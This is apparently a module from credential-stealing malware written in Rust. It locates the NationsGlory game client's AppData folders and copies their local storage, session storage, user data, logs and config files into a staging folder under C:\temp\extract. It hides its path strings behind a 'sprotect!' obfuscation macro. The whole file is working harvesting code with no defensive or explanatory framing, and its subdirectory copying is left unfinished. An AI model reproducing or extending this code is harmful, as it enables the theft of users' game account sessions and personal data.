use crate::sprotect;
use std::path::PathBuf;
use std::fs;

pub async fn extract() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\Games\\NationsGlory");
    std::fs::create_dir_all(&output_dir)?;

    let nationsglory_paths = detect_nationsglory_paths().await;
    
    for nationsglory_path in nationsglory_paths {
        extract_nationsglory_data(&nationsglory_path, &output_dir).await?;
    }

    Ok(())
}

async fn detect_nationsglory_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    
    let userprofile = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    
    let nationsglory_locations = vec![
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\NationsGlory")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\NationsGlory")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\nationsglory")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\nationsglory")),
    ];

    for path_str in nationsglory_locations {
        let path = PathBuf::from(path_str);
        if path.exists() {
            paths.push(path);
        }
    }

    paths
}

async fn extract_nationsglory_data(nationsglory_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    extract_local_storage(nationsglory_path, output_dir).await?;
    extract_session_storage(nationsglory_path, output_dir).await?;
    extract_user_data(nationsglory_path, output_dir).await?;
    Ok(())
}

async fn extract_local_storage(nationsglory_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let storage_path = nationsglory_path.join(sprotect!("Local Storage\\leveldb"));
    if storage_path.exists() {
        let storage_output = format!("{}{}", output_dir, sprotect!("\\LocalStorage"));
        copy_nationsglory_directory(&storage_path, &storage_output).await?;
    }
    Ok(())
}

async fn extract_session_storage(nationsglory_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let session_path = nationsglory_path.join(sprotect!("Session Storage"));
    if session_path.exists() {
        let session_output = format!("{}{}", output_dir, sprotect!("\\SessionStorage"));
        copy_nationsglory_directory(&session_path, &session_output).await?;
    }
    Ok(())
}

async fn extract_user_data(nationsglory_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let user_dirs = vec![
        sprotect!("User Data"),
        sprotect!("logs"),
        sprotect!("Cache"),
        sprotect!("Preferences"),
    ];

    for user_dir in user_dirs {
        let user_path = nationsglory_path.join(&user_dir);
        if user_path.exists() {
            let user_output = format!("{}\\{}", output_dir, user_dir.replace(" ", "_"));
            copy_selective_nationsglory_files(&user_path, &user_output).await?;
        }
    }

    Ok(())
}

async fn copy_nationsglory_directory(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                let dest_path = format!("{}\\{}", dest_dir, file_name);
                fs::copy(&path, dest_path).ok();
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                let new_dest = format!("{}\\{}", dest_dir, dir_name);
                
            }
        }
    }
    Ok(())
}

async fn copy_selective_nationsglory_files(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_nationsglory_important_file(&file_name) {
                    let dest_path = format!("{}\\{}", dest_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_nationsglory_important_dir(&dir_name) {
                    let new_dest = format!("{}\\{}", dest_dir, dir_name);
                    
                }
            }
        }
    }
    Ok(())
}

fn is_nationsglory_important_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let important_extensions = [sprotect!(".json"), sprotect!(".db"), sprotect!(".ldb"), sprotect!(".log"), sprotect!(".txt")];
    let important_keywords = [sprotect!("user"), sprotect!("account"), sprotect!("session"), sprotect!("preference"), sprotect!("config")];
    
    important_extensions.iter().any(|ext| filename_lower.ends_with(ext)) ||
    important_keywords.iter().any(|keyword| filename_lower.contains(keyword))
}

fn is_nationsglory_important_dir(dirname: &str) -> bool {
    let dirname_lower = dirname.to_lowercase();
    let important_dirs = [sprotect!("leveldb"), sprotect!("session"), sprotect!("local"), sprotect!("user"), sprotect!("default")];
    
    important_dirs.iter().any(|dir| dirname_lower.contains(dir))
}